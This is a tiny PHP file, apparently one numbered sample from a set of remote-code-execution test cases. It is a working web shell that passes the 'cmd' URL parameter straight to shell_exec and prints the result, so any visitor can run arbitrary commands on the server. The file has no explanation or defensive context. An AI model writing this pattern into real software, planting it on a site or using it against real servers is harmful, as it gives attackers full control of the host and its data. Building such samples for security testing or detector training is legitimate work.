<?php
// RCE test variation #471
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>